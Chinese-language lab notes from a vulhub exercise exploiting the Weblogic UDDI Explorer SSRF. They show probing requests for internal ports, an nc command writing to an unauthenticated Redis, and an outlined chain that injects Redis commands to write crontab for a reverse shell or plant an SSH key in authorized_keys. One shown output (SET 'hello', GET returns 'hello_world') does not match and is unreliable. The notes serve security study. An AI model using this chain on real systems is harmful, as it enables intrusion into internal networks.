## 环境

```
cd vulhub\weblogic\ssrf
docker-compose up -d
```

Weblogic 拉下来后自己补一个 Redis 进同一网络：

```
docker run -d --name redis-ssrf --network ssrf_default vulhub/redis:4.0.14
```

容器拓扑：

| 容器 | IP | 端口 |
|------|------|------|
| Weblogic | 172.20.0.2 | 7001 |
| Redis | 172.20.0.3 | 6379（未授权） |

浏览器打开 `http://192.168.1.167:7001/uddiexplorer/`，无需登录。

## SSRF 探测

Burp 抓包，改 `operator` 参数指向内网地址：

### 测 7001 端口（开着）
```
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:7001&rdoSearch=name&txtSearchname=test&btnSubmit=Search HTTP/1.1
Host: 192.168.1.167:7001
```
→ 返回 `404 Not Found` → **端口开着，SSRF 生效**

![](99_Attachments/图片/Weblogic%20SSRF%20内网探测/file-20260723103347580.png)

### 测 Redis（6379）
```
operator=http://172.20.0.3:6379/
```
→ 返回 `Response contained no data` → **非 HTTP 协议，判断为 Redis**

![](99_Attachments/图片/Weblogic%20SSRF%20内网探测/file-20260723103447368.png)

## 原理：SSRF + Redis = 内网穿透

```
攻击者 → Weblogic(外网可达) → 内网 Redis(外网不可达)
         SSRF 代发请求          被 SSRF 打中
```

## 为什么 CRLF 注入没成

JDK 8u121 起内置 CRLF 保护，`%0d%0a` 在 URL 里被直接拒绝。老版本 Weblogic（2014 年左右）没这层防御才可行。

但从 Weblogic 容器直接 `nc` Redis 验证了整个链路：

```
echo -e "SET ssrf_test hello\r" | nc 172.20.0.3 6379
→ +OK
redis> GET ssrf_test
→ hello_world
```

**内网可达性 + Redis 未授权 = 条件具备。** 换老版本 JDK 或 curl 方式即可 CRLF。

## 实战利用链（完整）

```
SSRF 探测内网
  → operator=http://{host}:{port}/ 逐个试
  → 根据错误信息差异判断端口开否
  
找到 Redis
  → 非 HTTP 响应 ≠ 404 ≠ 超时
  → 判断为 Redis/Memcached 等

CRLF 注入写 crontab（老版本 JDK）
  → %0d%0a 注入 SET / CONFIG SET / SAVE
  → 写 /etc/crontab
  → 反弹 Shell

或者写 SSH 公钥
  → config set dir /root/.ssh/
  → config set dbfilename authorized_keys
  → SSH 免密登录
```
